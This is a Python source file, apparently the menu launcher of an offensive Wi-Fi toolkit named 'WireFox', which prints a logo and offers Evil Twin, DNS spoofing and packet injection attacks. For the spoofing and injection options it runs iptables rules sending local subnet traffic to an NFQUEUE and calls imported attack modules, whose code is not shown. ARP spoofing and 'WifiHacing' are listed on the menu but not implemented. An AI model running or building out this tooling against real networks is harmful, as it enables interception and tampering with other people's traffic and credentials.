import sys

try:
    from scapy.all import *
except:
    print("Scapy is not installed!, please run <python3 install.py>")
    sys.exit(2)

import os
from evil_twin import evil_twin
from DnsSpoofing import DnsSpoofing
from PacketInjection import PacketInject


def logo():
    os.system("clear")
    print(u"""

\u001b[32;1mdb   d8b   db d888888b d8888b. d88888b d88888b  .d88b.  db    db
88   I8I   88   `88'   88  `8D 88'     88'     .8P  Y8. `8b  d8'
88   I8I   88    88    88oobY' 88ooooo 88ooo   88    88  `8bd8'
Y8   I8I   88    88    88`8b   88~~~~~ 88~~~   88    88  .dPYb.
`8b d8'8b d8'   .88.   88 `88. 88.     88      `8b  d8' .8P  Y8.
 `8b8' `8d8'  Y888888P 88   YD Y88888P YP       `Y88P'  YP    YP

\u001b[4m  01010111 01101001 01110010 01100101 01000110 01101111 01111000  """)
    print("\n\n")


def EvilTwin(iface):
    evil_twin.start(iface)

def wirefox():
    logo()
    print(u"""\u001b[4m\u001b[37;1m                   {1}--EvilTwin
                   {2}--ArpSpoofing
                   {3}--DnsSpoofing
                   {4}--PacketInjection
                   {5}--WifiHacing\u001b[0m


          """)

    option = input(u"\u001b[33;1m[WireFox]-> ")
    if option == "1":
        iface = input("[^] (monitor interface name)-> ")
        EvilTwin(iface)

    elif option == "3":
        hosts = input(u"\u001b[33;1m[^] (All dns spoofing or just Config hosts? A/C) # ")
        if hosts == "A" or hosts == "a" or hosts == "all" or hosts == "All":
            ip = input(u"\n\u001b[33;1m[^] (IP For Spoof)-> ")
            print(u"\u001b[32m")
            os.system("iptables -I INPUT -d 192.168.1.0/24 -j NFQUEUE --queue-num 0")
            DnsSpoofing.start(ip)
        elif hosts == "C" or hosts == "c" or hosts == "Config" or hosts == "config":
            os.system("iptables -I INPUT -d 192.168.1.0/24 -j NFQUEUE --queue-num 0")
            try:
                DnsSpoofing.start()
            except:
                os.system("iptables --flush")
                sys.exit(1)

    elif option == "4":
        try:
            file = input(u"\u001b[33;1m[^] (File address for inject)-> ")
            os.system("iptables -I INPUT -d 192.168.1.0/24 -j NFQUEUE --queue-num 0")

            PacketInject.start(file)

        except KeyboardInterrupt:
            os.system("iptables --flush")
            sys.exit(1)
        except FileNotFoundError:
            print(u"\u001b[31m[*] File Not Found!")
            os.system("iptables --flush")
            sys.exit(1)

wirefox()
